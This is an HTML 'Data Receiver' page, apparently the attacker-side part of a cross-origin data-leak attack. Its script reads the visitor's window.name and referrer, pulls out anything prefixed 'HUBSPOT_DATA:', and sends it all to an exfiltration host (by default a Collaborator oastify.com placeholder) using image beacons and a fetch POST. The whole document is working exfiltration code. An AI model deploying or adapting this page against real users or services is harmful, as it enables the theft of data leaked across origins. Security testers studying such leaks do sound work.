<!DOCTYPE html>
<html>
<head><title>Receiver</title></head>
<body>
<h1>Data Receiver</h1>
<div id="data" style="word-wrap:break-word;max-width:800px;"></div>
<script>
const EXFIL = new URLSearchParams(location.search).get('exfil') || 'https://YOUR_COLLABORATOR_ID.oastify.com';

// Read window.name
const name = window.name;
const ref = document.referrer;

const dataDiv = document.getElementById('data');
const nameLabel = document.createElement('strong');
nameLabel.textContent = 'Window Name: ';
const nameText = document.createTextNode((name || '(empty)'));
const refLabel = document.createElement('strong');
refLabel.textContent = 'Referrer: ';
const refText = document.createTextNode((ref || '(none)'));
const lenLabel = document.createElement('strong');
lenLabel.textContent = 'Length: ';
const lenText = document.createTextNode(name.length + ' chars');
[nameLabel, nameText, document.createElement('br'), document.createElement('br'),
 refLabel, refText, document.createElement('br'), document.createElement('br'),
 lenLabel, lenText].forEach(el => dataDiv.appendChild(el));

// Exfiltrate
new Image().src = EXFIL + '/?name=' + encodeURIComponent(name);
new Image().src = EXFIL + '/?ref=' + encodeURIComponent(ref);
new Image().src = EXFIL + '/?len=' + name.length;

// If data starts with "HUBSPOT_DATA:", extract it
if (name.startsWith('HUBSPOT_DATA:')) {
    const extracted = name.substring(13);
    new Image().src = EXFIL + '/?extracted=' + encodeURIComponent(extracted);
    
    // Try to parse as JSON
    try {
        const parsed = JSON.parse(extracted);
        new Image().src = EXFIL + '/?parsed=success&keys=' + Object.keys(parsed).join(',');
    } catch(e) {
        new Image().src = EXFIL + '/?parsed=failed';
    }
}

// Send full POST
fetch(EXFIL + '/data', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
        name: name,
        referrer: ref,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    })
});
</script>
</body>
</html>
